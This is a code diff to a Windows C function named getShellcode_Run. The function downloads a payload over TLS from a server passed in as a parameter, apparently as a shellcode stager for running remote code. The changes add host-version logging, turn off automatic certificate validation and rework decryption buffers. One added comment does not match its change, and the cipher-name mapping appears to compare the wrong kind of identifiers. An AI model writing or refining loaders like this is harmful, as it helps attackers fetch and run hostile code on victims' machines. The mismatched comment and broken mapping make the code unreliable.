@@ -35,6 +35,15 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     int fullResponseLen = 0;
     int totalSize = 0;
 
+    // Log Windows version for debugging
+    OSVERSIONINFO osvi;
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+    GetVersionEx(&osvi);
+    char osMsg[256];
+    sprintf_s(osMsg, 256, "Windows Version: %d.%d (Build %d)\n", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
+    OutputDebugStringA(osMsg);
+
     // Build proper HTTP request with cache-control headers
     sprintf_s(sendbuf, MAX_PATH, 
         "GET /%s HTTP/1.1\r\n"
@@ -118,10 +127,10 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
     OutputDebugStringA("Connected to server successfully\n");
 
-    // Initialize SSL
+    // Initialize SSL with a specific cipher suite
     SCHANNEL_CRED schannelCred = {0};
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;  // Force TLS 1.2
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
     schannelCred.dwFlags = 0;
 
     OutputDebugStringA("Acquiring credentials handle...\n");
@@ -140,7 +149,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     SecBufferDesc outBuffer, inBuffer;
     SecBuffer outBuffers[1], inBuffers[2];
     DWORD dwFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
-                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
+                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM | ISC_REQ_MANUAL_CRED_VALIDATION;
 
     outBuffers[0].pvBuffer = NULL;
     outBuffers[0].BufferType = SECBUFFER_TOKEN;
@@ -231,13 +240,27 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto Cleanup;
     }
 
-    // Log the negotiated cipher suite
+    // Log the negotiated cipher suite with more detail
     SecPkgContext_ConnectionInfo connInfo;
     secStatus = QueryContextAttributesA(&hContext, SECPKG_ATTR_CONNECTION_INFO, &connInfo);
     if (secStatus == SEC_E_OK) {
         char logMsg[256];
-        sprintf_s(logMsg, 256, "Negotiated Protocol: 0x%04X, Cipher: 0x%04X\n", connInfo.dwProtocol, connInfo.aiCipher);
+        sprintf_s(logMsg, 256, "Negotiated Protocol: 0x%04X, Cipher: 0x%04X, Hash: 0x%04X\n",
+                  connInfo.dwProtocol, connInfo.aiCipher, connInfo.aiHash);
         OutputDebugStringA(logMsg);
+
+        // Map the cipher suite to a human-readable name (simplified)
+        if (connInfo.dwProtocol == 0x0303) {  // TLS 1.2
+            if (connInfo.aiCipher == 0x2F && connInfo.aiHash == 0x1) {
+                OutputDebugStringA("Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA\n");
+            } else if (connInfo.aiCipher == 0x9C && connInfo.aiHash == 0xA2) {
+                OutputDebugStringA("Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n");
+            } else if (connInfo.aiCipher == 0x9E && connInfo.aiHash == 0xA3) {
+                OutputDebugStringA("Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n");
+            } else {
+                OutputDebugStringA("Cipher Suite: Unknown\n");
+            }
+        }
     }
 
     // Encrypt and send the HTTP request
@@ -352,27 +375,36 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                     break;
                 }
 
-                // Set up buffers for decryption
-                inBuffers[0].pvBuffer = sslBuf + processedBytes;
-                inBuffers[0].cbBuffer = totalRecordLen;
-                inBuffers[0].BufferType = SECBUFFER_DATA;
-                inBuffers[1].BufferType = SECBUFFER_EMPTY;
-                inBuffers[1].cbBuffer = 0;
-                inBuffers[1].pvBuffer = NULL;
-                inBuffer.cBuffers = 2;
-                inBuffer.pBuffers = inBuffers;
+                // Set up buffers for decryption (use 4 buffers as recommended by SChannel)
+                SecBuffer inBufs[4] = {0};
+                SecBufferDesc inBuffer = {0};
+                inBufs[0].pvBuffer = sslBuf + processedBytes;
+                inBufs[0].cbBuffer = totalRecordLen;
+                inBufs[0].BufferType = SECBUFFER_DATA;
+                inBufs[1].BufferType = SECBUFFER_EMPTY;
+                inBufs[2].BufferType = SECBUFFER_EMPTY;
+                inBufs[3].BufferType = SECBUFFER_EMPTY;
+                inBuffer.cBuffers = 4;
+                inBuffer.pBuffers = inBufs;
                 inBuffer.ulVersion = SECBUFFER_VERSION;
 
                 OutputDebugStringA("Decrypting message...\n");
                 secStatus = DecryptMessage(&hContext, &inBuffer, 0, NULL);
                 if (secStatus == SEC_E_OK) {
-                    int decryptedLen = inBuffers[1].cbBuffer;
+                    // Find the decrypted data buffer
+                    int decryptedLen = 0;
+                    for (int i = 0; i < 4; i++) {
+                        if (inBufs[i].BufferType == SECBUFFER_DATA) {
+                            decryptedLen = inBufs[i].cbBuffer;
+                            if (fullResponseLen + decryptedLen < sizeof(fullResponse)) {
+                                memcpy(fullResponse + fullResponseLen, inBufs[i].pvBuffer, decryptedLen);
+                                fullResponseLen += decryptedLen;
+                            }
+                            break;
+                        }
+                    }
                     sprintf_s(logMsg, 256, "Decrypted %d bytes\n", decryptedLen);
                     OutputDebugStringA(logMsg);
-                    if (fullResponseLen + decryptedLen < sizeof(fullResponse)) {
-                        memcpy(fullResponse + fullResponseLen, inBuffers[1].pvBuffer, decryptedLen);
-                        fullResponseLen += decryptedLen;
-                    }
                     processedBytes += totalRecordLen;
                 } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
                     OutputDebugStringA("Incomplete message (unexpected), need more data\n");
